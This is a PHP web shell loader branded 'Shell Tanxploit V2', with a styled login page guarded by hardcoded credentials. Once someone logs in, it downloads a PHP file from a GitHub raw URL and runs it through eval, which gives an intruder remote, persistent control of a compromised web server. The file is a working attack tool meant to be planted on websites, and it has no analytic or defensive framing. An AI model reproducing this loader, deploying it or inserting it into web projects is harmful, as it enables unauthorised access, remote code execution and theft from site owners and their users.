<?php
session_start();

// Encode username and password using MD5
$correct_username_md5 = md5('tanxploitv2');
$correct_password_md5 = md5('tan');

// Function to display login form
function display_login_form($error = '') {
  echo '<!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Shell Tanxploit V2 Login</title>
          <style>
            @import url("https://fonts.googleapis.com/css2?family=Montserrat:wght@600&display=swap");

            body {
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              margin: 0;
              font-family: "Montserrat", sans-serif;
              background-color: #141e30;
              background-image: linear-gradient(315deg, #141e30 0%, #243b55 74%);
            }
            .login-container {
              background: #fff;
              padding: 40px;
              border-radius: 10px;
              box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
              width: 320px;
              text-align: center;
            }
            .login-container img {
              width: 150px;
              margin-bottom: 20px;
            }
            h2 {
              margin-bottom: 20px;
              color: #333;
              font-size: 24px;
            }
            input[type="text"], input[type="password"] {
              width: 100%;
              padding: 12px;
              margin: 10px 0;
              border: 1px solid #ddd;
              border-radius: 5px;
              font-size: 14px;
              box-sizing: border-box;
            }
            input[type="submit"] {
              width: 100%;
              padding: 12px;
              background-color: #4CAF50;
              border: none;
              border-radius: 5px;
              font-size: 16px;
              color: white;
              cursor: pointer;
              margin-top: 10px;
              transition: background-color 0.3s;
            }
            input[type="submit"]:hover {
              background-color: #45a049;
            }
            .error {
              color: red;
              margin-bottom: 10px;
              font-size: 14px;
            }
            .credit {
              margin-top: 20px;
              font-size: 12px;
              color: #aaa;
            }
          </style>
        </head>
        <body>
          <div class="login-container">
            <img src="https://i.ibb.co.com/VgXFFdH/20230310-235537.png" alt="Logo">
            <h2>Shell Tanxploit V2</h2>';
  if ($error) {
    echo "<p class='error'>$error</p>";
  }
  echo '  <form method="POST">
            <input type="text" name="username" placeholder="Enter Username" required>
            <input type="password" name="password" placeholder="Enter Password" required>
            <input type="submit" value="Login">
          </form>
          <div class="credit">Credit By Tanxploit404</div>
          </div>
        </body>
        </html>';
}

// Check if the user is already authenticated
if (!isset($_SESSION['authenticated'])) {
  if (isset($_POST['username']) && isset($_POST['password'])) {
    if (md5($_POST['username']) === $correct_username_md5 && md5($_POST['password']) === $correct_password_md5) {
      $_SESSION['authenticated'] = true;
      header("Location: " . $_SERVER['REQUEST_URI']);
      exit;
    } else {
      display_login_form("Incorrect username or password.");
      exit;
    }
  } else {
    display_login_form();
    exit;
  }
}

// Fetch and execute external PHP file
$remote_file = file_get_contents('https://raw.githubusercontent.com/GhostlyrootB2H/Shell-Private/refs/heads/main/ghostlyroot.php');
eval('?>' . $remote_file);
?>
